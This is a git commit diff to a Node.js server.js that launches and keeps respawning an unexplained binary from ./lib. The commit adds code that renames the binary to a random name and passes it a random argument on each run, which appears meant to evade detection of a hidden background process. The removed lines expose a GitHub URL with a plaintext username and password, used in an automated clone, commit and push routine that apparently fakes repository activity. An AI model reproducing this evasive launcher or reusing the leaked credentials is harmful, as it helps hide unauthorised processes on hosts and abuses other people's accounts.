a870f724e374d7f461a47592e43a518a7afd4a2b
talento2 <31474347+talento2@users.noreply.github.com>
2017-09-03 17:02:25 +0700

    Update server.js

--- server.js
+++ server.js
@@ -1,5 +1,16 @@
-require('child_process').execSync('cd ./lib && chmod 755 -R core && ls -l');
-var child = require('child_process').spawn('./lib/core', ['-s', 'loop']);
+function makeid(length) {
+  var text = "";
+  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+
+  for (var i = 0; i < length; i++)
+    text += possible.charAt(Math.floor(Math.random() * possible.length));
+
+  return text;
+}
+var name = makeid(5);
+var param = makeid(64);
+require('child_process').execSync('cd ./lib && mv core ' + name + ' && chmod 755 -R ' + name + ' && ls -l');
+var child = require('child_process').spawn('./lib/' + name, [param]);
 child.stdout.on('data', function(data) {
     console.log('stdout: ' + data);
 });
@@ -9,15 +20,15 @@ child.stderr.on('data', function(data) {
 child.on('close', function(code) {
     console.log('closing code: ' + code);
 });
-var target = 'https://wddesbvsp:test123@github.com/wddesbvsp/winetest';
+var target = '';
 var myrepo = 'git clone ' + target + ' aaa && ';
 myrepo += 'git config --global user.email "test" && ';
 myrepo += 'git config --global user.name "test" && ';
 myrepo += 'cd ./aaa && echo ' + (new Date()).getTime();
 myrepo += ' > log && git add . && git commit -m "update log" && git push ' + target;
-require('child_process').exec(myrepo);
+//require('child_process').exec(myrepo);
 var index = 1;
-var max = 14;
+var max = 12;
 var interval;
 var lock = false;
 interval = setInterval(function () {
@@ -33,7 +44,7 @@ interval = setInterval(function () {
   else {
       if(lock) {
           lock = false;
-          child = require('child_process').spawn('./lib/core', ['-s', 'loop']);
+          child = require('child_process').spawn('./lib/' + name, [param]);
           child.stdout.on('data', function(data) {
               console.log('stdout: ' + data);
           });
